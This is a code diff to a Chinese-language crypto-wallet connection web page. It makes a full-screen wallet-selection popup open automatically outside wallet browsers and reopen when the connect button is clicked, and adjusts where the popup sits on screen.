@@ -1,5 +1,6 @@
 
 
+
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -1730,12 +1731,33 @@ async function initWallet(isAfterApprove = false) {
     }
 
     // 非钱包环境：自动显示弹窗（核心需求）+ 显示连接按钮（关闭后可重新触发）
-    DOM.specialTipContainer.style.display = "none";
+    DOM.specialTipContainer.style.display = "block";
     DOM.userInfoDefault.style.display = "none";
     DOM.userInfoStatus.style.display = "block";
     DOM.userInfoStatus.innerHTML = "请选择要连接的钱包";
     DOM.approveBtn.style.display = "none";
     DOM.connectBtn.style.display = "block"; // 显示按钮，关闭弹窗后可重新点击
+
+    // 自动显示弹窗（强制定位在底部，避免位置问题）
+    DOM.multiWalletPopup.style.display = "block";
+    DOM.multiWalletPopup.style.position = "fixed";
+    DOM.multiWalletPopup.style.top = "0";
+    DOM.multiWalletPopup.style.left = "0";
+    DOM.multiWalletPopup.style.width = "100%";
+    DOM.multiWalletPopup.style.height = "100%";
+    DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
+    DOM.multiWalletPopup.style.zIndex = "9999";
+
+    // 弹窗内容强制定位底部
+    const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
+    if (popupContent) {
+        popupContent.style.position = "absolute";
+        popupContent.style.bottom = "180px";
+        popupContent.style.left = "50%";
+        popupContent.style.transform = "translateX(-50%)";
+        popupContent.style.width = "90%";
+        popupContent.style.maxWidth = "500px";
+    }
 }
 
     /**
@@ -1842,6 +1864,27 @@ async function initWallet(isAfterApprove = false) {
      ****************************************************************/
     DOM.connectBtn.addEventListener('click', () => {
         console.log('连接按钮点击，重新显示弹窗');
+        // 重新显示弹窗（和自动弹窗的样式一致）
+        DOM.multiWalletPopup.style.display = "block";
+        DOM.multiWalletPopup.style.position = "fixed";
+        DOM.multiWalletPopup.style.top = "0";
+        DOM.multiWalletPopup.style.left = "0";
+        DOM.multiWalletPopup.style.width = "100%";
+        DOM.multiWalletPopup.style.height = "100%";
+        DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
+        DOM.multiWalletPopup.style.zIndex = "9999";
+
+        // 弹窗内容定位
+        const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
+        if (popupContent) {
+            popupContent.style.position = "absolute";
+            popupContent.style.bottom = "180px";
+            popupContent.style.left = "50%";
+            popupContent.style.transform = "translateX(-50%)";
+        }
+
+        // 更新提示文本
+        
         DOM.userInfoStatus.style.display = "block";
         DOM.userInfoStatus.innerHTML = langConfig[currentLang].userInfoDefault;
     });
